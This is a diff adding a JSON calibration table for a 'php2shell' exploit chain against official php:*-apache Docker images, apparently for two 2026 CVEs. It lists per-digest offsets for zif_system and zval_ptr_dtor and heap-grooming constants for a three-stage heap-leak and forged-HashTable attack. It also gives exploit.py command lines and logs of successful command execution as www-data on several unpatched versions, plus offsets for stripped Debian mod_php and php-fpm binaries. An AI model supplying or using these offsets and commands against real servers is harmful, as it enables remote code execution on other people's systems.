@@ -1,0 +1,368 @@
+{
+  "schema": 1,
+  "title": "php2shell 偏移标定表（按镜像 digest）",
+  "cve": [
+    "CVE-2026-109618",
+    "CVE-2026-109619"
+  ],
+  "exploit": {
+    "path": "php8.5.11/exploit.py",
+    "md5": "52be3ef0c1cadb63430f587f910175d0",
+    "identical_copy": "php8.4.26/exploit.py",
+    "based_on": "9bie/php2shell-bypass-aslr-exp",
+    "source_of_offsets": "docker/offsets.py（读 libphp.so 的 ELF 符号表）"
+  },
+  "profiles": {
+    "bookworm": {
+      "说明": "官方 php:*-apache 镜像（Debian bookworm + 官方 configure + mod_php + 本仓库 docker/php.ini）",
+      "htdata": "0x690d8",
+      "stage1_n": 841,
+      "stage2_t": 406,
+      "stage2_v": 16,
+      "stage3_pads": "[(31,31)]*6",
+      "sid": "attacksessionid0001",
+      "cli_flag": "--profile bookworm（默认）"
+    },
+    "lab": {
+      "说明": "lab 自编译的 PHP（不同 configure 选项 / 不同 Debian 版本），仅作对照",
+      "htdata": "0x6e0d8",
+      "stage1_n": 892,
+      "stage2_t": 443,
+      "stage2_v": 1,
+      "stage3_pads": "[(8,7)] + [(7,7)]*5",
+      "sid": "attacksessionid0001",
+      "cli_flag": "--profile lab"
+    }
+  },
+  "images": [
+    {
+      "php_version": "8.5.11",
+      "tag": "php:8.5.11-apache",
+      "image_id": "sha256:b384c1b31d2008af2160a735bb856317926f893553293f526024019a31d0fd6b",
+      "repo_digest": "sha256:47e6d8849049375e0d19e81f1b391ed88828d4653e0d1b00822185b66b564e8b",
+      "libphp_path": "/usr/lib/apache2/modules/libphp.so",
+      "zif_system": "0x5996e0",
+      "zval_ptr_dtor": "0x7b47a0",
+      "delta_dtor_to_zif": "-0x21b0c0",
+      "heap": {
+        "profile": "bookworm",
+        "htdata": "0x690d8",
+        "stage1_n": 841,
+        "stage2_t": 406,
+        "stage2_v": 16,
+        "stage3_pads": "[(31,31)]*6",
+        "sid": "attacksessionid0001"
+      },
+      "status": "exploitable",
+      "verified": true,
+      "evidence": {
+        "proof": "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
+        "cmd": "python3 exploit.py -u http://127.0.0.1:8088/index.php --zif-offset 0x5996e0 --dtor-offset 0x7b47a0",
+        "note": "三个 stage 全通，是本表主靶标；但批量采集里失败过一次（33s，stage3 未落 PROOF），随后单独重跑 attempt 1 即通 → 失败是堆布局抖动，不是标定错",
+        "attempts": [
+          {
+            "ok": false,
+            "elapsed_s": 33.2,
+            "marker": "",
+            "at": "2026-10-21T21:55:05Z"
+          }
+        ]
+      },
+      "notes": "主参考版本。stage1/stage2 各重试 2–3 次是常态。",
+      "flaky": true
+    },
+    {
+      "php_version": "8.5.10",
+      "tag": "php:8.5.10-apache",
+      "image_id": "sha256:884bb79798900bbe8b84263c1d5f1aa692034c17a763b601221e94c696f473e5",
+      "repo_digest": "sha256:e7c4a78bc342384903c942f50329636cf9c9d0b1b51860065f443c048f260c43",
+      "libphp_path": "/usr/lib/apache2/modules/libphp.so",
+      "zif_system": "0x598d60",
+      "zval_ptr_dtor": "0x7b3860",
+      "delta_dtor_to_zif": "-0x21ab00",
+      "heap": {
+        "profile": "bookworm",
+        "htdata": "0x690d8",
+        "stage1_n": 841,
+        "stage2_t": 406,
+        "stage2_v": 16,
+        "stage3_pads": "[(31,31)]*6",
+        "sid": "attacksessionid0001"
+      },
+      "status": "exploitable",
+      "verified": true,
+      "evidence": {
+        "proof": "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
+        "cmd": "python3 exploit.py -u http://127.0.0.1:8111/index.php --zif-offset 0x598d60 --dtor-offset 0x7b3860",
+        "note": "首次批量跑出现 HEAP_LEAK_FAILED（stage1 未命中），单独重跑一次即三次 stage 全通 → 属重试敏感，不是偏移错",
+        "attempts": [
+          {
+            "ok": false,
+            "elapsed_s": 7.3,
+            "marker": "HEAP_LEAK_FAILED",
+            "at": "2026-10-21T21:53:48Z"
+          },
+          {
+            "ok": true,
+            "elapsed_s": 7.6,
+            "marker": "PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)",
+            "at": "2026-10-21T21:55:53Z"
+          }
+        ]
+      },
+      "notes": "与 8.5.11 只差符号偏移，堆常量一致。",
+      "flaky": true
+    },
+    {
+      "php_version": "8.5.4",
+      "tag": "php:8.5.4-apache",
+      "image_id": "sha256:37e821ea0fa5045dfff31d6f090989bf295e4cee96cd05e01db2cd9ee5ef3584",
+      "repo_digest": "sha256:11a145bc831dee8ff6f22a1726bad35a0d0f2b4e77df4a9f8c79c3e6e96d6f12",
+      "libphp_path": "/usr/lib/apache2/modules/libphp.so",
+      "zif_system": "0x5705e0",
+      "zval_ptr_dtor": "0x788ba0",
+      "delta_dtor_to_zif": "-0x2185c0",
+      "heap": {
+        "profile": "bookworm(部分)",
+        "htdata": "0x690d8",
+        "stage1_n": 841,
+        "stage2_t": 406,
+        "stage2_v": 16,
+        "stage3_pads": "[(31,31)]*6（此处不适用）",
+        "sid": "attacksessionid0001"
+      },
+      "status": "partial",
+      "verified": false,
+      "evidence": {
+        "proof": "",
+        "cmd": "python3 exploit.py -u http://127.0.0.1:8110/index.php --zif-offset 0x5705e0 --dtor-offset 0x788ba0",
+        "note": "stage1 chunk base ✅、stage2 libphp base ✅、stage3 五次全失败，容器日志每次都是 zend_mm_heap corrupted",
+        "attempts": [
+          {
+            "ok": false,
+            "elapsed_s": 25.1,
+            "marker": "",
+            "at": "2026-10-21T21:52:40Z"
+          }
+        ]
+      },
+      "notes": "泄漏几何（stage1/stage2 的 stage1_n、stage2_t、stage2_v）与本族一致，stage3 的 htdata/pads 需要单独重标。日志出现 zend_mm_heap corrupted 说明伪造 HashTable 已生效、崩在后续析构，不是偏移写错。"
+    },
+    {
+      "php_version": "8.5.12",
+      "tag": "php:8.5.12-apache",
+      "image_id": "sha256:3aaf6c3363d21d928e512092ef5af8a3528cbde3bd001401e389242d94796cae",
+      "repo_digest": "sha256:4d1f268dd3b670bd003861c5385cb2f8ba7196dbc88ee84dcae47270c116f242",
+      "libphp_path": "/usr/lib/apache2/modules/libphp.so",
+      "zif_system": "0x59fae0",
+      "zval_ptr_dtor": "0x7c11a0",
+      "delta_dtor_to_zif": "-0x2216c0",
+      "heap": {
+        "profile": "bookworm",
+        "htdata": "0x690d8",
+        "stage1_n": 841,
+        "stage2_t": 406,
+        "stage2_v": 16,
+        "stage3_pads": "[(31,31)]*6",
+        "sid": "attacksessionid0001"
+      },
+      "status": "patched",
+      "verified": false,
+      "evidence": {
+        "proof": "",
+        "cmd": "python3 calibrate/collect.py --verify php:8.5.12-apache",
+        "note": "负向对照：stage1 直接 HEAP_LEAK_FAILED（4.4s，三次重试全灭），泄漏面被修掉",
+        "attempts": [
+          {
+            "ok": false,
+            "elapsed_s": 4.4,
+            "marker": "HEAP_LEAK_FAILED",
+            "at": "2026-10-21T21:53:59Z"
+          }
+        ]
+      },
+      "notes": "官方修复版。符号照记，用于验证「是漏洞被修了而不是偏移写错」。"
+    },
+    {
+      "php_version": "8.4.26",
+      "tag": "php:8.4.26-apache",
+      "image_id": "sha256:46b195b6378e712d1a65cd3f853242bebd7f3cb4cafe137fd592b365909d2c17",
+      "repo_digest": "sha256:60111400ff77bdc44fa79b4f072afe49a42abba71e0846ad496be4761dc9c11a",
+      "libphp_path": "/usr/lib/apache2/modules/libphp.so",
+      "zif_system": "0x465370",
+      "zval_ptr_dtor": "0x65eb60",
+      "delta_dtor_to_zif": "-0x1f97f0",
+      "heap": {
+        "profile": "bookworm",
+        "htdata": "0x690d8",
+        "stage1_n": 841,
+        "stage2_t": 406,
+        "stage2_v": 16,
+        "stage3_pads": "[(31,31)]*6",
+        "sid": "attacksessionid0001"
+      },
+      "status": "exploitable",
+      "verified": true,
+      "evidence": {
+        "proof": "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
+        "cmd": "python3 exploit.py -u http://127.0.0.1:8089/index.php --zif-offset 0x465370 --dtor-offset 0x65eb60",
+        "note": "跨大版本仍用同一套 bookworm 堆常量打通 → 堆标定跟构建族走",
+        "attempts": [
+          {
+            "ok": true,
+            "elapsed_s": 7.4,
+            "marker": "PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)",
+            "at": "2026-10-21T21:55:42Z"
+          }
+        ]
+      },
+      "notes": "与 8.5.11 共用堆常量，只换符号偏移即可复用同一条链。"
+    },
+    {
+      "php_version": "8.4.25",
+      "tag": "php:8.4.25-apache",
+      "image_id": "sha256:c9df646f55dc70fe170515b16aa5d6629e94eb40ca31fdae4294178b6051670f",
+      "repo_digest": "sha256:bcdc7a2fe1003e50d80ef9c820f0ab00f9023c565c3a162e05d5825e20b04fc5",
+      "libphp_path": "/usr/lib/apache2/modules/libphp.so",
+      "zif_system": "0x464c70",
+      "zval_ptr_dtor": "0x65dc60",
+      "delta_dtor_to_zif": "-0x1f8ff0",
+      "heap": {
+        "profile": "bookworm",
+        "htdata": "0x690d8",
+        "stage1_n": 841,
+        "stage2_t": 406,
+        "stage2_v": 16,
+        "stage3_pads": "[(31,31)]*6",
+        "sid": "attacksessionid0001"
+      },
+      "status": "exploitable",
+      "verified": true,
+      "evidence": {
+        "proof": "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
+        "cmd": "python3 calibrate/collect.py --verify php:8.4.25-apache",
+        "note": "7.3s 一次通过，无需重试",
+        "attempts": [
+          {
+            "ok": true,
+            "elapsed_s": 7.3,
+            "marker": "PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)",
+            "at": "2026-10-21T21:52:29Z"
+          }
+        ]
+      },
+      "notes": "8.4 系列里离 8.4.26 最近的未修复版；与 8.4.26 偏移只差 0x700 / 0x900（同族连续构建）。"
+    },
+    {
+      "php_version": "8.3.36",
+      "tag": "php:8.3.36-apache",
+      "image_id": "sha256:7ee673f08963aa38fcbd9732a209b20bc74a9fe264feeed8252ec4594734ccea",
+      "repo_digest": "sha256:d89e8b3d2033c3179dcd9999d913670eb12a07410a95e60205c64e7d0fac7aef",
+      "libphp_path": "/usr/lib/apache2/modules/libphp.so",
+      "zif_system": "0x3b2a00",
+      "zval_ptr_dtor": "0x4a9510",
+      "delta_dtor_to_zif": "-0xf6b10",
+      "heap": {
+        "profile": "bookworm",
+        "htdata": "0x690d8",
+        "stage1_n": 841,
+        "stage2_t": 406,
+        "stage2_v": 16,
+        "stage3_pads": "[(31,31)]*6",
+        "sid": "attacksessionid0001"
+      },
+      "status": "patched",
+      "verified": false,
+      "evidence": {
+        "proof": "",
+        "cmd": "python3 calibrate/collect.py --no-verify php:8.3.36-apache",
+        "note": "只采符号，未跑运行验证（同批修复版，按 8.5.12 的负向对照类推）"
+      },
+      "notes": "8.3 分支修复版。"
+    },
+    {
+      "php_version": "8.2.35",
+      "tag": "php:8.2.35-apache",
+      "image_id": "sha256:745174152c4e5ddc9854adea24a2c408129c27384010e29b31303e1b50e3caae",
+      "repo_digest": "sha256:9c371129bfc78a90269f140b6dcebf826591dc35865a1076c218d765731de732",
+      "libphp_path": "/usr/lib/apache2/modules/libphp.so",
+      "zif_system": "0x3a1da0",
+      "zval_ptr_dtor": "0x491910",
+      "delta_dtor_to_zif": "-0xefb70",
+      "heap": {
+        "profile": "bookworm",
+        "htdata": "0x690d8",
+        "stage1_n": 841,
+        "stage2_t": 406,
+        "stage2_v": 16,
+        "stage3_pads": "[(31,31)]*6",
+        "sid": "attacksessionid0001"
+      },
+      "status": "patched",
+      "verified": false,
+      "evidence": {
+        "proof": "",
+        "cmd": "python3 calibrate/collect.py --no-verify php:8.2.35-apache",
+        "note": "只采符号；同一 digest 也被 php:8.2-apache 这个浮动 tag 指向"
+      },
+      "notes": "8.2 分支修复版。tag 漂移样例：php:8.2-apache 早前指向 sha256:9e5766bc…，现指向本 digest。"
+    },
+    {
+      "php_version": "7.4.21",
+      "tag": "php:7.4.21-apache",
+      "image_id": "sha256:85010dbbaa84d78e2a4c83bb4d6c1fa9b2fb94e383cc1cc1f32ec555603fe93f",
+      "repo_digest": "sha256:eb212d85f4f560b437962b04abcd3c553035f9fb1567831b83a2c40e121dadc9",
+      "libphp_path": "/usr/lib/apache2/modules/libphp7.so",
+      "zif_system": "0x32be30",
+      "zval_ptr_dtor": "0x410b90",
+      "delta_dtor_to_zif": "-0xe4d60",
+      "heap": {
+        "profile": "bookworm",
+        "htdata": "0x690d8",
+        "stage1_n": 841,
+        "stage2_t": 406,
+        "stage2_v": 16,
+        "stage3_pads": "[(31,31)]*6",
+        "sid": "attacksessionid0001"
+      },
+      "status": "broken",
+      "verified": false,
+      "evidence": {
+        "proof": "",
+        "cmd": "python3 php7421_poc.py --mode session / --mode ht",
+        "note": "hash 插入缺陷真实可精确触发（OOM 时 tried=name+32），但无通用 in-band 地址泄漏；session 链被 progress->sid 前置条件 + send_cookie 无条件清零封死"
+      },
+      "notes": "7.4 结构不同（libphp7.so、session 语义差异），这套三阶段链不适用；符号偏移仍按 digest 记录备查。"
+    }
+  ],
+  "binaries": [
+    {
+      "binary": "libphp8.2.so",
+      "source": "Debian bookworm：libapache2-mod-php8.2 8.2.32-1~deb12u1（apt 装，非 docker 官方镜像）",
+      "php_version": "8.2.32",
+      "sha256": "9047cd7039456b30781488f1c057c86e4e2f9e176fd8f418c93180c96a8b7ec5",
+      "stripped": true,
+      "has_symtab": false,
+      "zif_system": "0x22d2d0",
+      "zval_ptr_dtor": "0x2f3a90",
+      "delta_dtor_to_zif": "-0xc67c0",
+      "zif_source": "find_zif.py（扫 .data.rel.ro 里的 zend_function_entry：fname=\"system\" → handler）",
+      "verified_by": "libapache2-mod-php8.2-dbgsym 的 .symtab 给出 zif_system=0x22d2d0 / zval_ptr_dtor=0x2f3a90，与扫描结果一致",
+      "heap": "未标定：bookworm 与 lab 两套常量都在 stage1（heap leak）失败"
+    },
+    {
+      "binary": "php-fpm8.2",
+      "source": "Debian bookworm：php8.2-fpm 8.2.32-1~deb12u1",
+      "php_version": "8.2.32",
+      "sha256": "12e4c614d8026c38406b32e0dd9639b8db45e729d78e744fea9f1fddf510129a",
+      "stripped": true,
+      "has_symtab": false,
+      "zif_system": "0x221450",
+      "zval_ptr_dtor": "0x2e7c10",
+      "delta_dtor_to_zif": "-0xc67c0",
+      "zif_source": "find_zif.py",
+      "verified_by": "与同构建 libphp8.2.so 的 delta 完全一致（0xc67c0）→ delta 是构建级常量，一次标定覆盖 mod_php 与 fpm 两个二进制",
+      "heap": "未标定（SAPI 不同，堆布局与 mod_php 不同）"
+    }
+  ]
+}
